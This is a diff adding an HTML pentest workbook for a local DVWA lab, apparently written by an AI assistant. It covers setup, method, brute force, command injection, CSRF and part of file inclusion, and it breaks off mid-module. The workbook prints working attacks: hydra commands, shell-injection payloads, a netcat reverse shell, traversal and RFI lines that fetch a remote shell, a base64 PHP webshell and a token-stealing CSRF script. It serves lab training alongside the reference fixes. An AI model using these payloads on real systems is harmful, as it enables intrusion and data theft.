@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>DVWA — End-to-End Pentest Lab Workbook (v2.5)</title>
+<style>
+  :root{
+    --bg:#0e1116; --panel:#151a21; --panel2:#1b212b; --line:#273040; --chip:#1f2630;
+    --txt:#e6edf3; --mut:#9fb0c3; --acc:#e8623d; --acc2:#f0a24b; --ok:#3fb950;
+    --warn:#d29922; --bad:#f85149; --blue:#58a6ff; --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--txt);font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  .wrap{display:grid;grid-template-columns:270px 1fr;min-height:100vh}
+  nav.side{position:sticky;top:0;align-self:start;height:100vh;overflow-y:auto;background:var(--panel);border-right:1px solid var(--line);padding:22px 16px}
+  nav.side h1{font-size:19px;margin:0 0 2px}
+  nav.side .tag{display:inline-block;font-size:11px;color:var(--mut);border:1px solid var(--line);border-radius:20px;padding:2px 9px;margin-bottom:16px}
+  nav.side a{display:block;color:var(--mut);text-decoration:none;font-size:13.5px;padding:5px 8px;border-radius:7px}
+  nav.side a:hover{background:var(--panel2);color:var(--txt)}
+  nav.side a.m{color:var(--acc2);margin-top:12px;font-weight:600}
+  nav.side a .num{display:inline-block;width:24px;color:#5a6a7e;font-family:var(--mono);font-size:12px}
+  main{padding:34px 42px 100px;max-width:980px}
+  header.top h2{font-size:27px;margin:0 0 6px}
+  header.top p{color:var(--mut);margin:4px 0}
+  code{font-family:var(--mono);background:var(--chip);border:1px solid var(--line);border-radius:5px;padding:1px 6px;font-size:12.5px}
+  pre{background:#0b0f14;border:1px solid var(--line);border-radius:9px;padding:13px 15px;overflow-x:auto;font-family:var(--mono);font-size:12.7px;line-height:1.55;color:#d7e2ee}
+  pre .c{color:#6e7f92}
+  pre .s{color:#7ee787}
+  pre .r{color:#ff9492}
+  a{color:var(--blue)}
+  .banner{background:linear-gradient(90deg,#241310,#17202b);border:1px solid #3a2b22;border-left:4px solid var(--acc);border-radius:10px;padding:14px 16px;margin:20px 0}
+  .banner b{color:var(--acc2)}
+  section.mod{background:var(--panel);border:1px solid var(--line);border-radius:13px;padding:22px 24px;margin:26px 0}
+  section.mod h3{display:flex;align-items:center;gap:10px;font-size:20px;margin:0 0 4px;border-bottom:1px solid var(--line);padding-bottom:12px}
+  section.mod h3 .mn{color:var(--txt)}
+  section.mod h4{color:var(--acc2);font-size:15px;margin:18px 0 6px}
+  section.mod h5{color:var(--blue);font-size:13.5px;margin:12px 0 4px}
+  .meta{display:flex;flex-wrap:wrap;gap:6px;margin:10px 0 4px}
+  .pill{font-size:11px;font-family:var(--mono);border-radius:20px;padding:2px 9px;border:1px solid var(--line);white-space:nowrap}
+  .p-ok{background:#0f2417;color:#56d364;border-color:#1f6f3a}
+  .p-warn{background:#2a2110;color:#e3b341;border-color:#6b5420}
+  .p-bad{background:#2a1314;color:#ff7b72;border-color:#6e2b2b}
+  .p-info{background:#0f1d2e;color:#79c0ff;border-color:#1f4a73}
+  .p-cwe{background:#1a1324;color:#c89bf0;border-color:#4b2f6b}
+  details{background:var(--panel2);border:1px solid var(--line);border-radius:10px;margin:10px 0;overflow:hidden}
+  details>summary{cursor:pointer;padding:11px 14px;font-weight:600;list-style:none;display:flex;align-items:center;gap:8px;user-select:none}
+  details>summary::-webkit-details-marker{display:none}
+  details>summary:before{content:"▸";color:var(--acc);font-size:13px}
+  details[open]>summary:before{content:"▾"}
+  details>summary .lv{font-family:var(--mono);font-size:11px;color:#fff;border-radius:5px;padding:1px 7px;margin-left:2px}
+  .lv-low{background:#2f6f3a}.lv-med{background:#8a6d1f}.lv-high{background:#9a4420}.lv-imp{background:#2f3a52}
+  details .inner{padding:4px 16px 16px;border-top:1px solid var(--line)}
+  .sp{margin-left:auto;color:#5a6a7e;font-size:11px;font-weight:400}
+  table{border-collapse:collapse;width:100%;margin:10px 0;font-size:13px}
+  th,td{border:1px solid var(--line);padding:7px 10px;text-align:left;vertical-align:top}
+  th{background:var(--panel2);color:var(--acc2)}
+  .warnbox{background:#2a1314;border:1px solid #6e2b2b;border-radius:9px;padding:11px 14px;margin:12px 0;color:#ffc1bd;font-size:13px}
+  .okbox{background:#0f2417;border:1px solid #1f6f3a;border-radius:9px;padding:11px 14px;margin:12px 0;color:#9ff0b3;font-size:13px}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .map{color:var(--mut);font-size:13px}
+  .stars{color:var(--acc2);font-size:12px;letter-spacing:1px}
+  footer{color:var(--mut);font-size:12.5px;border-top:1px solid var(--line);margin-top:34px;padding-top:18px}
+  .legend{display:flex;flex-wrap:wrap;gap:16px;font-size:12.5px;color:var(--mut)}
+  @media(max-width:1000px){.wrap{grid-template-columns:1fr}nav.side{display:none}main{padding:24px 16px 80px}.grid2{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="wrap">
+<nav class="side">
+  <h1>🩸 DVWA</h1>
+  <span class="tag">Pentest Lab Workbook · v2.5</span>
+  <a class="m" href="#how">How to use this</a>
+  <a href="#setup"><span class="num">00</span>Setup, recon &amp; method</a>
+  <a href="#method"><span class="num">00+</span>Web pentest method &amp; toolkit</a>
+  <a href="#m1"><span class="num">01</span>Brute Force</a>
+  <a href="#m2"><span class="num">02</span>Command Injection</a>
+  <a href="#m3"><span class="num">03</span>CSRF</a>
+  <a href="#m4"><span class="num">04</span>File Inclusion (LFI/RFI)</a>
+  <a href="#m5"><span class="num">05</span>File Upload</a>
+  <a href="#m6"><span class="num">06</span>Insecure CAPTCHA</a>
+  <a href="#m7"><span class="num">07</span>SQL Injection</a>
+  <a href="#m8"><span class="num">08</span>SQL Injection (Blind)</a>
+  <a href="#m9"><span class="num">09</span>Weak Session IDs</a>
+  <a href="#m10"><span class="num">10</span>XSS (DOM)</a>
+  <a href="#m11"><span class="num">11</span>XSS (Reflected)</a>
+  <a href="#m12"><span class="num">12</span>XSS (Stored)</a>
+  <a href="#m13"><span class="num">13</span>CSP Bypass</a>
+  <a href="#m14"><span class="num">14</span>JavaScript Attacks</a>
+  <a href="#m15"><span class="num">15</span>Authorisation Bypass</a>
+  <a href="#m16"><span class="num">16</span>Open HTTP Redirect</a>
+  <a href="#m17"><span class="num">17</span>Cryptography</a>
+  <a href="#m18"><span class="num">18</span>API Security</a>
+  <a class="m" href="#report">Reporting &amp; evidence</a>
+  <a href="#close">Progress &amp; next steps</a>
+</nav>
+
+<main>
+<header class="top">
+  <h2>DVWA — End-to-End Pentest Lab Workbook</h2>
+  <p>A tutor-style, methodology-first path through every DVWA module on your own <code>http://localhost:4280</code>, across all four security levels. Built for the <a href="https://github.com/dheeraj-jayaswal/From-Dev-To-Attacker">From-Dev-To-Attacker</a> roadmap — your Phase&nbsp;2/3 web lab, the companion to the Juice Shop workbook.</p>
+  <p class="map">Scope: authorized, local, intentionally vulnerable target. Nothing here leaves your machine.</p>
+</header>
+
+<div class="banner">
+  <b>Version check first.</b> This workbook targets <b>DVWA v2.5 "Vulnerable APIs"</b> (latest release, 29 Jan 2025 — <span class="pill p-ok">FACT: Verified</span> from GitHub releases). The 2.x line is a full rewrite vs. the old 1.x walkthroughs you'll find online, so two things changed that matter: <b>PHPIDS was removed</b> (there is no WAF layer to evade here — <span class="pill p-ok">FACT: Verified</span>), and the Docker image serves on <b>port 4280</b>, not 80. Confirm your build from the footer of any page, or the git tag:
+  <pre><span class="c"># in your DVWA checkout</span>
+git -C DVWA describe --tags            <span class="c"># expect v2.5 (or master ahead of it)</span>
+git -C DVWA log --oneline -1</pre>
+  If your menu is missing <b>Authorisation Bypass</b>, <b>Open HTTP Redirect</b>, <b>Cryptography</b> or <b>API</b>, you're on an older build (1.x / early 2.x) — tell me and I'll re-map those modules.
+</div>
+
+<section class="mod" id="how">
+  <h3><span class="mn">How to use this workbook</span></h3>
+  <p>DVWA is not a scoreboard of challenges — it's <b>18 modules</b>, each solvable at four security levels: <span class="pill p-ok">Low</span> <span class="pill p-warn">Medium</span> <span class="pill p-bad">High</span> <span class="pill p-info">Impossible</span>. <b>The level ladder is the entire curriculum.</b> For a developer moving into offensive work, this is the highest-signal lab you'll run, because every module ships a <b>View Source</b> button and a <b>Compare All Levels</b> view: you exploit <code>low.php</code>, then read why <code>medium.php</code> / <code>high.php</code> fail to stop you, then read <code>impossible.php</code> — the reference secure implementation. That low→impossible diff <em>is</em> the dev→pentester mental model.</p>
+  <ol>
+    <li><b>Work each module top-down:</b> Low → Medium → High → Impossible. Don't skip to High; the point is seeing what each control adds and how it's bypassed.</li>
+    <li><b>Read the source every time.</b> After you solve a level, open <code>View Source</code> and diff it against the next. This is the step most people skip and it's where the learning is.</li>
+    <li><b>Write a finding card per module</b> (template at the end). Treat your own localhost like a client engagement — this builds the muscle and the report portfolio your roadmap needs.</li>
+    <li><b>Grading legend</b> — two independent scales (your house rule), kept distinct:</li>
+  </ol>
+  <div class="legend">
+    <div><b>EVIDENCE</b> (did you prove it?): <span class="pill p-ok">VERIFIED</span> reproduced w/ impact · <span class="pill p-warn">STRONG SIGNAL</span> · <span class="pill p-bad">WEAK SIGNAL</span> · <span class="pill p-info">THEORETICAL</span></div>
+    <div><b>FACT</b> (is the claim confirmed?): <span class="pill p-ok">Verified</span> primary source this session · <span class="pill p-warn">Likely</span> · <span class="pill p-bad">Unverified</span></div>
+  </div>
+  <p style="margin-top:12px" class="map">Note on FACT grades below: module <em>mechanics and payloads</em> for DVWA are stable and well-established (mostly <span class="pill p-warn">Likely</span>; the v2.5 structural facts are <span class="pill p-ok">Verified</span>). <b>CWE IDs and OWASP category numbers are marked <span class="pill p-warn">Likely</span> unless you confirm them against the live source/MITRE this session</b> — per your own rule, a mapping written in a guide is not a verified fact. The authoritative source for each fix is the <code>impossible.php</code> you can read on your own box.</p>
+</section>
+
+<!-- ===================== SETUP ===================== -->
+<section class="mod" id="setup">
+  <h3><span class="mn">00 · Setup, recon &amp; method</span></h3>
+
+  <h4>A. Run it (Docker — recommended)</h4>
+  <pre>git clone https://github.com/digininja/DVWA.git &amp;&amp; cd DVWA
+docker compose up -d                 <span class="c"># web + MariaDB</span>
+<span class="c"># → http://localhost:4280   login: admin / password</span>
+<span class="c"># Then: "Setup DVWA" (left menu) → "Create / Reset Database" → log in again.</span></pre>
+  <p class="map">Docker default security level in <code>compose.yml</code> is <code>impossible</code> (<span class="pill p-ok">FACT: Verified</span>). Set it to <code>low</code> to start, either in the <b>DVWA Security</b> menu each session, or persistently:</p>
+  <pre><span class="c"># compose.yml, under the dvwa service:</span>
+environment:
+  - DB_SERVER=db
+  - DEFAULT_SECURITY_LEVEL=low       <span class="c"># low | medium | high | impossible</span></pre>
+
+  <h4>B. Run it (manual — XAMPP / LAMP, if you didn't use Docker)</h4>
+  <pre><span class="c"># Debian/Kali-style packages</span>
+sudo apt install -y apache2 mariadb-server php php-mysqli php-gd libapache2-mod-php
+cp config/config.inc.php.dist config/config.inc.php
+<span class="c"># config.inc.php defaults:</span>
+<span class="c">#   db_user = dvwa   db_password = p@ssw0rd   db_database = dvwa</span>
+mysql -u root -e "CREATE DATABASE dvwa; CREATE USER dvwa@localhost IDENTIFIED BY 'p@ssw0rd'; GRANT ALL ON dvwa.* TO dvwa@localhost;"
+<span class="c"># Place files under the web root, then browse to  http://127.0.0.1/DVWA/setup.php</span></pre>
+  <div class="warnbox"><b>Classic gotcha:</b> the folder is <code>DVWA</code> (uppercase). <code>http://localhost/dvwa</code> 404s on Linux because the path is case-sensitive. <span class="pill p-ok">FACT: Verified</span></div>
+  <p class="map">To enable the harder modules fully: <b>File Upload</b> needs <code>./hackable/uploads/</code> writable; <b>File Inclusion RFI</b> needs <code>allow_url_include=On</code> in <code>php.ini</code>; <b>Insecure CAPTCHA</b> needs reCAPTCHA keys in config; <b>API</b> needs <code>mod_rewrite</code> + Composer vendor files (<code>composer install</code>). The Docker image wires most of this for you. <span class="pill p-warn">FACT: Likely</span></p>
+
+  <h4>C. The five seeded accounts (for brute force / access-control work)</h4>
+  <table>
+    <tr><th>User</th><th>Password</th><th>Note</th></tr>
+    <tr><td><code>admin</code></td><td><code>password</code></td><td>app admin; only admin sees the Authorisation Bypass tab</td></tr>
+    <tr><td><code>gordonb</code></td><td><code>abc123</code></td><td>standard second user — use as the "attacker" account</td></tr>
+    <tr><td><code>1337</code></td><td><code>charley</code></td><td>standard user</td></tr>
+    <tr><td><code>pablo</code></td><td><code>letmein</code></td><td>standard user</td></tr>
+    <tr><td><code>smithy</code></td><td><code>password</code></td><td>standard user</td></tr>
+  </table>
+  <p class="map"><span class="pill p-warn">FACT: Likely</span> — these are the long-standing DVWA seed users; confirm the exact set from your <code>Create/Reset Database</code> output, which prints them.</p>
+
+  <h4>D. Instrument &amp; recon</h4>
+  <pre><span class="c"># Burp/ZAP: localhost is often proxy-bypassed. Browse 127.0.0.1:4280 OR remove the bypass.</span>
+<span class="c"># The session + security level live in cookies — this is central to DVWA:</span>
+<span class="c">#   PHPSESSID=...;  security=low|medium|high|impossible</span>
+<span class="c"># Flip difficulty straight from the request in Burp by editing the `security` cookie.</span>
+
+<span class="c"># Map the module surface (every lab lives under /vulnerabilities/&lt;name&gt;/):</span>
+curl -s -b "PHPSESSID=$SID; security=low" http://localhost:4280/ | grep -oE '/vulnerabilities/[a-z_]+/' | sort -u
+
+<span class="c"># Each module exposes its own source at:</span>
+<span class="c">#   /vulnerabilities/&lt;name&gt;/source/{low,medium,high,impossible}.php  (via View Source)</span></pre>
+
+  <h4>E. The stack (so the bugs make sense)</h4>
+  <p>Server-rendered <b>PHP</b> on <b>Apache</b>, data in <b>MariaDB/MySQL</b> (so SQLi is classic <code>mysqli</code>/error-based, not NoSQL). State is cookie-driven: <code>security</code> cookie selects which of the four PHP files handles your request. There is <b>no SPA, no JWT, no PHPIDS</b> in 2.x. The pedagogical spine is the four-file-per-module layout — <code>low/medium/high/impossible.php</code> — which lets you read the exact control added at each step.</p>
+
+  <h4>F. Method per module (do this every time)</h4>
+  <table>
+    <tr><th>Step</th><th>What</th></tr>
+    <tr><td>1 · Recon</td><td>Read the module's on-page help + hint. Identify the input(s) and where they land (SQL, shell, filesystem, HTML sink, header).</td></tr>
+    <tr><td>2 · Baseline</td><td>Send a benign value through Burp. Note the exact request/response shape.</td></tr>
+    <tr><td>3 · Exploit Low</td><td>Prove the bug with the minimal payload. Capture request + response as evidence.</td></tr>
+    <tr><td>4 · Read source</td><td>View Source for Low, then Medium. Predict the bypass from the diff <em>before</em> trying it.</td></tr>
+    <tr><td>5 · Climb</td><td>Medium → High. Each level adds one control; defeat exactly that control.</td></tr>
+    <tr><td>6 · Impossible</td><td>Don't attack — read it. This is the fix you'll recommend. Map to CWE + the right OWASP category.</td></tr>
+    <tr><td>7 · Card</td><td>Write the finding card: evidence grade, FACT grades on IDs, CVSS v4.0 vector, code-level fix.</td></tr>
+  </table>
+</section>
+
+<!-- ===================== METHODOLOGY + TOOLKIT ===================== -->
+<section class="mod" id="method">
+  <h3><span class="mn">00+ · Web app pentest methodology &amp; toolkit</span></h3>
+  <p>DVWA is the sandbox; <b>this</b> is the real engagement flow it's training you for. Every module below slots into one of these phases — when you can run this loop end-to-end on an unfamiliar app, you can pentest web.</p>
+  <table>
+    <tr><th>Phase</th><th>What you do</th><th>DVWA modules that drill it</th><th>Standard</th></tr>
+    <tr><td>1 · Recon &amp; mapping</td><td>Spider the app, enumerate endpoints/params/versions, read client JS, map auth + roles, note the tech stack.</td><td>API (v1/v2 discovery), DOM XSS, Weak Session IDs</td><td>WSTG-INFO</td></tr>
+    <tr><td>2 · Authentication</td><td>Test login, brute-force resistance, lockout, password reset, session issuance.</td><td>Brute Force, Weak Session IDs</td><td>WSTG-ATHN, OWASP A07</td></tr>
+    <tr><td>3 · Authorization</td><td>Function-level + object-level (IDOR/BOLA), forced browsing, privilege escalation.</td><td>Authorisation Bypass, API, CSRF</td><td>WSTG-ATHZ, OWASP A01</td></tr>
+    <tr><td>4 · Input handling</td><td>Every injection class: SQL, OS command, path, template, file.</td><td>SQLi, Blind SQLi, Command Injection, File Inclusion, File Upload</td><td>WSTG-INPV, OWASP A03</td></tr>
+    <tr><td>5 · Client-side</td><td>XSS (all three), CSP soundness, trust in client logic.</td><td>XSS ×3, CSP Bypass, JavaScript</td><td>WSTG-CLNT, OWASP A03</td></tr>
+    <tr><td>6 · Business logic</td><td>Multi-step flows, workflow bypasses, anti-automation.</td><td>Insecure CAPTCHA, Open Redirect</td><td>WSTG-BUSL, OWASP A04</td></tr>
+    <tr><td>7 · Crypto &amp; config</td><td>Weak ciphers, oracles, key/IV handling, security misconfig, backdoors.</td><td>Cryptography, CSP, Insecure CAPTCHA (dev backdoor)</td><td>OWASP A02/A05</td></tr>
+    <tr><td>8 · Reporting</td><td>Finding card, evidence grade, CVSS, code-level fix (the <code>impossible.php</code> you read).</td><td>every module</td><td>CVSS v4.0, CWE</td></tr>
+  </table>
+
+  <h4>Core toolkit (install once)</h4>
+  <table>
+    <tr><th>Need</th><th>Tool</th><th>Used for (modules)</th></tr>
+    <tr><td>Intercepting proxy</td><td><b>Burp Suite</b> (Community is enough) / OWASP ZAP</td><td>everything — repeater, intruder, decoder, sequencer</td></tr>
+    <tr><td>SQLi automation</td><td><b>sqlmap</b></td><td>SQLi, Blind SQLi</td></tr>
+    <tr><td>Auth brute force</td><td><b>hydra</b> / Burp Intruder / <b>ffuf</b></td><td>Brute Force</td></tr>
+    <tr><td>Padding oracle</td><td><b>padbuster</b> / custom Python</td><td>Cryptography High</td></tr>
+    <tr><td>Hash cracking</td><td><b>hashcat</b> / <b>john</b> + <code>rockyou.txt</code></td><td>SQLi dumps, API hashes</td></tr>
+    <tr><td>Image polyglot / metadata</td><td><b>exiftool</b></td><td>File Upload High</td></tr>
+    <tr><td>Encoding / crypto scratchpad</td><td><b>CyberChef</b></td><td>JavaScript, Cryptography</td></tr>
+    <tr><td>OOB / callbacks</td><td><b>interactsh</b> / your own listener</td><td>Command Injection, blind classes</td></tr>
+    <tr><td>Content/endpoint discovery</td><td><b>ffuf</b> / <b>gobuster</b></td><td>recon, API versioning, forced browsing</td></tr>
+  </table>
+  <p class="map">Set Burp's scope to <code>localhost:4280</code> and remember the <code>security</code> cookie: you can switch difficulty mid-request in Repeater without touching the UI. That one trick turns four separate labs into one fast A/B of each control.</p>
+</section>
+
+<!-- ===================== 01 BRUTE FORCE ===================== -->
+<section class="mod" id="m1">
+  <h3><span class="mn">01 · Brute Force</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A07:2021 Identification &amp; Auth Failures</span><span class="pill p-cwe">CWE-307</span><span class="pill p-cwe">CWE-799</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>Login form with no (Low) / weak (Med/High) anti-automation. Target <code>admin</code>; wordlist e.g. <code>rockyou.txt</code> with <code>password</code> seeded in.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> GET creds, no protection <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Creds in the query string, unlimited attempts. Hydra against the GET form; the failure string is <code>Username and/or password incorrect.</code></p>
+    <pre>hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4280 \
+  http-get-form "/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=incorrect:H=Cookie: PHPSESSID=$SID; security=low"</pre>
+    <p>Or Burp Intruder (Sniper on <code>password</code>, filter by response length). <span class="pill p-ok">EVIDENCE: VERIFIED</span> once you recover <code>admin:password</code>.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> adds <code>sleep()</code> on failure <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Source adds <code>mysqli_real_escape_string()</code> (kills SQLi on the form) and a <code>sleep(2)</code> delay after a failed login. It does <b>not</b> lock out — it only slows you. Brute force still works; just throttle threads and wait.</p>
+    <pre>hydra -t 4 -l admin -P rockyou.txt 127.0.0.1 -s 4280 http-get-form \
+  "/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=incorrect:H=Cookie: PHPSESSID=$SID; security=medium"</pre>
+    <p class="map">Lesson: a fixed delay is not a rate limit. It costs the attacker wall-clock time, nothing else.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> adds an anti-CSRF <code>user_token</code> <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Each request must carry a one-time <code>user_token</code> hidden field; a stale/absent token is rejected. Hydra's simple form module can't harvest a fresh token per request, so you script it (grab token → submit → repeat) or use Burp Intruder with the <b>"Recursive grep"</b> payload type to pull the next <code>user_token</code> out of each response. There's also a randomised failure <code>sleep</code>.</p>
+    <pre><span class="c"># Pattern: GET page, regex out user_token, POST guess with it, repeat.</span>
+<span class="c"># Burp Macro / Intruder recursive-grep on name="user_token" value="([0-9a-f]+)"</span></pre>
+    <p class="map">Lesson: CSRF tokens incidentally raise the cost of blind automation, but they are <em>not</em> a brute-force control — they don't limit attempts, they just force stateful scraping.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Read <code>impossible.php</code>: it uses <b>PDO prepared statements</b>, the anti-CSRF token, and an <b>account lockout</b> — after 3 failed attempts the account is temporarily locked (<code>failed_login</code> count + timestamp), and it uses a constant-ish response regardless of whether the user exists. That combination — lockout + token + parametrised query — is what actually defeats brute force.</p>
+    <p><b>Fix to recommend:</b> rate-limit + progressive lockout + MFA; never leak user-existence via timing or message. <span class="pill p-cwe">CWE-307</span> Improper Restriction of Excessive Auth Attempts. <span class="pill p-warn">FACT: Likely</span> — confirm the exact lockout logic in your source.</p>
+  </div></details>
+</section>
+
+<!-- ===================== 02 COMMAND INJECTION ===================== -->
+<section class="mod" id="m2">
+  <h3><span class="mn">02 · Command Injection</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A03:2021 Injection</span><span class="pill p-cwe">CWE-78</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>A "ping" box passes your input into a shell <code>ping</code>. Linux containers use <code>ping -c 4 &lt;ip&gt;</code>.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> raw concatenation <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre>127.0.0.1; id
+127.0.0.1 &amp;&amp; whoami
+127.0.0.1 | cat /etc/passwd
+$(id)        <span class="c"># command substitution</span></pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> when <code>id</code>/<code>uid=</code> appears in the output. Pop a shell: <code>127.0.0.1; busybox nc &lt;you&gt; 4444 -e sh</code> (lab only).</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> blacklist of <code>&amp;&amp;</code> and <code>;</code> <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Source does <code>str_replace(['&amp;&amp;',';'], '', $target)</code> — a denylist. It misses every other shell metacharacter:</p>
+    <pre>127.0.0.1 | id            <span class="c"># pipe not filtered</span>
+127.0.0.1 &amp; id            <span class="c"># single &amp; survives (only &amp;&amp; stripped)</span>
+127.0.0.1 || id
+127.0.0.1 %0a id          <span class="c"># newline (URL-encoded) in some contexts</span></pre>
+    <p class="map">Lesson: denylists of "bad strings" are endlessly bypassable. <code>str_replace</code> of two tokens leaves <code>|</code>, <code>|</code><code>|</code>, <code>&amp;</code>, backticks, <code>$()</code>, newline.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> bigger blacklist — one gap <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>The denylist grows (<code>&amp;</code>, <code>;</code>, <code>|</code>, <code>-</code>, <code>$</code>, <code>(</code>,<code>)</code>, backtick, <code>||</code> …) but the classic DVWA bug is the filter strips <code>"| "</code> (<b>pipe-space</b>) not <code>"|"</code> (pipe, no space). So drop the space:</p>
+    <pre>127.0.0.1|id              <span class="c"># no space after the pipe → survives the blacklist</span></pre>
+    <p class="map">Lesson: blacklist entries are literal. An off-by-one in the token (<code>"| "</code> vs <code>"|"</code>) reopens the whole class. <span class="pill p-warn">FACT: Likely</span> — verify the exact array in your <code>high.php</code>.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> splits the input on <code>.</code>, checks each of the 4 octets with <code>is_numeric()</code> via <code>stripslashes</code>+<code>explode</code>, and only then builds the command — i.e. strict <b>input validation / allowlisting</b> to an IPv4 shape. No shell metacharacter can survive four numeric-octet checks.</p>
+    <p><b>Fix to recommend:</b> never pass user input to a shell; use a native API (<code>fsockopen</code>/ICMP lib) or, if you must shell out, validate to a strict allowlist and use argument arrays, not string concatenation. <span class="pill p-cwe">CWE-78</span>. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 03 CSRF ===================== -->
+<section class="mod" id="m3">
+  <h3><span class="mn">03 · CSRF</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A01:2021 Broken Access Control</span><span class="pill p-cwe">CWE-352</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>A "change password" form. Goal: craft a page that changes the victim's password when they visit it while logged in.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> GET, no token <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Password change is a GET with no anti-CSRF token. A single malicious URL / auto-submitting image does it:</p>
+    <pre>&lt;img src="http://localhost:4280/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change"&gt;</pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> when the victim's password changes with no interaction beyond page load.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> checks <code>Referer</code> <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Source requires the <code>Referer</code> header to <code>strpos()</code>-contain the server host name. Weak check — satisfy it by hosting the attack page so the host string appears in the path/host, or name your file to include the host:</p>
+    <pre><span class="c"># If SERVER_NAME is "localhost", a Referer that merely CONTAINS it passes.</span>
+<span class="c"># e.g. attacker page at  http://attacker/localhost/evil.html  → Referer contains "localhost"</span></pre>
+    <p class="map">Lesson: <code>Referer</code> substring checks are trivially satisfiable and the header is often absent/spoofable. Not a CSRF control.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> anti-CSRF <code>user_token</code> <span class="stars">★★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Now a per-request <code>user_token</code> is required. Pure CSRF is defeated — <em>unless</em> you can read the token cross-origin, which needs a <b>separate bug</b> (e.g. the Stored/Reflected XSS module) to exfiltrate it. That chain is the real lesson:</p>
+    <pre><span class="c"># Chain: XSS on same origin → fetch the change-password page →</span>
+<span class="c"># scrape user_token → submit new password with the live token.</span>
+fetch('/vulnerabilities/csrf/').then(r=&gt;r.text()).then(h=&gt;{
+  var t=h.match(/user_token' value='([0-9a-f]+)/)[1];
+  location='/vulnerabilities/csrf/?password_new=pwn&amp;password_conf=pwn&amp;user_token='+t+'&amp;Change=Change';
+});</pre>
+    <p class="map">Lesson: CSRF tokens work <em>only</em> if the origin has no XSS. CSRF + XSS is a canonical chain — exactly the kind of cross-surface thinking to write up.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> requires the <b>current password</b> to change it, uses the anti-CSRF token, and uses PDO. Requiring the current password defeats both blind CSRF and the XSS-assisted chain (attacker doesn't know it).</p>
+    <p><b>Fix to recommend:</b> anti-CSRF tokens (SameSite=strict cookies as defence-in-depth) + re-authentication for sensitive actions. <span class="pill p-cwe">CWE-352</span>. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 04 FILE INCLUSION ===================== -->
+<section class="mod" id="m4">
+  <h3><span class="mn">04 · File Inclusion (LFI / RFI)</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A03:2021 Injection</span><span class="pill p-cwe">CWE-98</span><span class="pill p-cwe">CWE-22</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p><code>?page=include.php</code> passes a filename into PHP <code>include()</code>. LFI reads/executes local files; RFI (if <code>allow_url_include=On</code>) pulls a remote shell.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> no filtering <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre><span class="c"># LFI — path traversal</span>
+?page=../../../../etc/passwd
+?page=../../../../var/log/apache2/access.log   <span class="c"># → log poisoning → RCE</span>
+<span class="c"># RFI (needs allow_url_include=On)</span>
+?page=http://&lt;attacker&gt;/shell.txt
+<span class="c"># PHP wrappers</span>
+?page=php://filter/convert.base64-encode/resource=../low.php   <span class="c"># exfil source</span>
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&amp;c=id</pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> on <code>/etc/passwd</code> read or wrapper execution.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> str_replace of <code>http://</code> and <code>../</code> <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
